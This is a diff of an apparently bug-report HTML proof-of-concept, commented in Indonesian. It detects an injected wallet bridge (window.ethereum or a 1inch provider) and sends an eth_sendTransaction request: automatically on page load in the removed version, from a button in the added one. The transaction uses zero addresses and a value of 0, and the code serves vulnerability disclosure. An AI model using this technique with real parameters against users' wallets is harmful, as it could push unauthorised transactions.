@@ -1,70 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security PoC: JS Bridge Exposure</title>
+    <title>PoC: Unauthenticated Bridge Trigger</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; color: #333; }
-        .log-container { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', Courier, monospace; height: 350px; overflow-y: scroll; font-size: 14px; }
-        h2 { border-bottom: 2px solid #ddd; padding-bottom: 10px; }
-        .badge { padding: 5px 10px; border-radius: 4px; font-weight: bold; }
-        .critical { background: #ff4d4d; color: white; }
+        body { font-family: 'Segoe UI', sans-serif; padding: 20px; background: #0f172a; color: #f8fafc; }
+        .box { background: #1e293b; padding: 20px; border-radius: 12px; border: 1px solid #334155; }
+        pre { color: #38bdf8; overflow-x: auto; font-size: 13px; }
+        .trigger-btn { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>Security Proof of Concept</h2>
-    <p>Status: <span id="status" class="badge critical">Initializing...</span></p>
-    <div id="log-container" class="log-container"></div>
+    <div class="box">
+        <h2>Security PoC: Bridge Exposure</h2>
+        <p>Status: <span id="status">Menunggu Eksekusi...</span></p>
+        
+        <p><strong>Deteksi Bridge:</strong></p>
+        <pre id="bridge-info">Mendeteksi...</pre>
+
+        <button class="trigger-btn" onclick="triggerTransaction()">Trigger Transaksi Sekarang</button>
+        <p><small>*Transksi ini hanya simulasi (0 ETH)</small></p>
+    </div>
 
     <script>
-        const logContainer = document.getElementById('log-container');
-        function log(msg) {
-            const div = document.createElement('div');
-            div.textContent = `[${new Date().toISOString().split('T')[1].split('.')[0]}] ${msg}`;
-            logContainer.appendChild(div);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
+        // 1. Deteksi Bridge
+        const bridge = window.ethereum || window.OneInchProvider; // Tambahkan namespace 1inch
+        
+        window.onload = () => {
+            const info = document.getElementById('bridge-info');
+            if (bridge) {
+                info.textContent = "Bridge Terdeteksi!\nKeys: " + Object.keys(bridge).join(", ");
+                document.getElementById('status').textContent = "Bridge Siap";
+            } else {
+                info.textContent = "Tidak ada bridge ditemukan.";
+            }
+        };
 
-        async function runExploit() {
-            log("Starting Bridge Exposure Test...");
+        // 2. Fungsi Trigger Transaksi
+        async function triggerTransaction() {
+            if (!bridge) return alert("Bridge tidak ditemukan!");
             
-            // Mengakses objek bridge yang terdeteksi di video Anda
-            const bridge = window.ethereum;
-
-            if (!bridge) {
-                log("[-] Error: Bridge object not found.");
-                document.getElementById('status').textContent = "Failed";
-                return;
-            }
-
-            log("[+] Bridge object found: " + Object.keys(bridge).join(', '));
-            log("[!] Triggering 'eth_sendTransaction' without user gesture...");
-
             try {
-                // Parameter transaksi dummy (Sesuai dengan apa yang muncul di video Anda)
-                const txParams = {
-                    from: '0x0000000000000000000000000000000000000000',
-                    to: '0x0000000000000000000000000000000000000000',
-                    value: '0x00',
-                    data: '0x'
-                };
-
-                // Memicu transaksi secara otomatis
-                const result = await bridge.request({
+                document.getElementById('status').textContent = "Memicu Transaksi...";
+                await bridge.request({
                     method: 'eth_sendTransaction',
-                    params: [txParams]
+                    params: [{
+                        from: '0x0000000000000000000000000000000000000000',
+                        to: '0x0000000000000000000000000000000000000000',
+                        value: '0x00',
+                        data: '0x'
+                    }]
                 });
-
-                log("[+] Success: Result received: " + JSON.stringify(result));
-            } catch (err) {
-                log("[!] Transaction prompt triggered or rejected: " + err.message);
-                document.getElementById('status').textContent = "Triggered";
+            } catch (e) {
+                document.getElementById('status').textContent = "Triggered (User/System Rejected)";
             }
         }
-
-        // Jalankan otomatis saat page load
-        window.onload = () => runExploit();
     </script>
 </body>
 </html>
